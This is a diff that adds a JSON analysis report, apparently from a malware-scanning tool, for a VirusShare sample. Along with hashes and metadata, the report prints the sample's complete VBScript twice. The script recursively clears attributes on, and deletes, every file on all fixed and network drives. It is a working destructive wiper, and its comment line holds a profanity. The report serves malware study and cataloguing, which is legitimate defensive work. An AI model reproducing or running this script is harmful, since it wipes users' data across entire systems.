@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "'Copyright (C) 1998 by FlyShadow ~^^~ - Fuck\n On Error Resume Next\n Set FSO = CreateObject(\"Scripting.FileSystemObject\")\n For Each DType In FSO.Drives\n  If DType.DriveType = 2 Or DType.DriveType = 3 Then\n\tSearching(DType.Path&\"\\\")\n  End If\n Next\nSub Searching(fspec)\n On Error Resume Next\n Set FS4 = FSO.GetFolder(fspec)\n For Each F2F In FS4.Files\n\tFSO.GetFile(F2F.Path).Attributes = 32\n\tFSO.DeleteFile F2F.Path\n Next\n For Each F4D In FS4.SubFolders\n\tSearching(F4D.Path)\n Next\nEnd Sub"
+    },
+    "filename": "VirusShare_3d4d910939f91b4134b6eba062147247",
+    "filesize": 502,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3d4d910939f91b4134b6eba062147247",
+        "sha1": "a325e2ade7961d8aa054116f5c5367b90409c197",
+        "sha256": "30a959f5f0a0ea596611fa080b42ca76dbfe9871b872127e6be6171bda9ba08b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'Copyright (C) 1998 by FlyShadow ~^^~ - Fuck",
+            " On Error Resume Next",
+            " Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            " For Each DType In FSO.Drives",
+            "  If DType.DriveType = 2 Or DType.DriveType = 3 Then",
+            "\tSearching(DType.Path&\"\\\")",
+            "  End If",
+            " Next",
+            "Sub Searching(fspec)",
+            " On Error Resume Next",
+            " Set FS4 = FSO.GetFolder(fspec)",
+            " For Each F2F In FS4.Files",
+            "\tFSO.GetFile(F2F.Path).Attributes = 32",
+            "\tFSO.DeleteFile F2F.Path",
+            " Next",
+            " For Each F4D In FS4.SubFolders",
+            "\tSearching(F4D.Path)",
+            " Next",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263551",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
